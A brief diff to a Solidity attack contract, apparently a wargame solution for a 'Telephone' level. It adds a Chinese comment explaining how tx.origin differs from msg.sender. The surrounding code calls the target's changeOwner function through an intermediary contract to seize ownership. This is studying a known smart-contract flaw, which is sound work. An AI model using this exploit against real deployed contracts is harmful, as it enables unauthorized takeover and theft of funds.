@@ -44,7 +44,7 @@ contract TelephoneAttack{
     function changeOwnerAttack() public returns (bool){
       // 站在攻击合约的角度，msg.sender可能是我的钱包账号
       // 站在被攻击合约的角度，msg.sender是攻击合约的地址
-      // tx.origin就是我的钱包账号，被攻击合约收到的msg.sender是攻击合约地址
+      // tx.origin就是我的钱包账号(我调用攻击合约，发起攻击)，被攻击合约收到的msg.sender是攻击合约地址
       (bool success,) = address(telephone).call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
 
       return success;
